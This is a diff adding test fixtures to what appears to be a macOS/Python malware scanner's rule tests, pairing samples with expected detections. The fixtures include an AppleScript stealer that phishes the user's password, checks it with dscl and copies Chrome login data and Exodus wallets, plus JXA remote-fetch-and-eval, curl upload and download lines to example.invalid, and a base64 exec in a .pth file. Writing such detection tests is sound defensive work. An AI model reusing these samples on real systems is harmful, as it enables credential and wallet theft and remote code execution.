@@ -257,5 +257,49 @@
     "name": "amos_exfil_relative.sh",
     "text": "ditto -c -k --keepParent \"$D\" out.zip\ncurl --data-binary @out.zip https://example.invalid/u\n",
     "expected": "macos_archive_upload"
+  },
+  {
+    "name": "macos_dscl_stealer.scpt",
+    "text": "set pw to text returned of (display dialog \"Enter your password\" default answer \"\" with hidden answer)\ndo shell script \"dscl . authonly \" & quoted form of user & \" \" & quoted form of pw\ndo shell script \"cp ~/Library/Application\\\\ Support/Google/Chrome/Default/Login\\\\ Data /tmp/x/\"\ndo shell script \"cp -R ~/Library/Application\\\\ Support/Exodus /tmp/x/\"\n",
+    "expected": [
+      "macos_password_prompt",
+      "macos_stealer_password_check"
+    ]
+  },
+  {
+    "name": "macos_dscl_laps_benign.sh",
+    "text": "#!/bin/zsh\n# Check the rotated admin password\nif dscl /Local/Default -authonly \"$admin\" \"$pw\"; then echo ok; fi\nsecurity set-keychain-password -o \"$old\" -p \"$pw\" /Users/$admin/Library/Keychains/login.keychain-db\n",
+    "expected": null
+  },
+  {
+    "name": "macos_jxa_eval.js",
+    "text": "ObjC.import('Foundation');\nvar d = $.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://example.invalid/i.js'));\neval($.NSString.alloc.initWithDataEncoding(d, $.NSUTF8StringEncoding).js);\n",
+    "expected": "macos_jxa_remote_exec"
+  },
+  {
+    "name": "macos_jxa_shell_zip.zip",
+    "text": "var app = Application.currentApplication();\napp.includeStandardAdditions = true;\napp.doShellScript('curl -s https://example.invalid/p -o /tmp/p');\n",
+    "expected": "macos_jxa_remote_exec",
+    "container": "zip"
+  },
+  {
+    "name": "macos_jxa_local_benign.js",
+    "text": "var app = Application.currentApplication();\napp.includeStandardAdditions = true;\napp.doShellScript('ls ~/Desktop');\n",
+    "expected": null
+  },
+  {
+    "name": "python_exec.pth",
+    "text": "import os, base64; exec(base64.b64decode('cHJpbnQoJ2luZXJ0Jyk='))\n",
+    "expected": "dev_python_pth_exec"
+  },
+  {
+    "name": "python_distutils_benign.pth",
+    "text": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
+    "expected": null
+  },
+  {
+    "name": "python_exec_renamed_benign.py",
+    "text": "import os, base64; exec(base64.b64decode('cHJpbnQoJ2luZXJ0Jyk='))\n",
+    "expected": null
   }
 ]
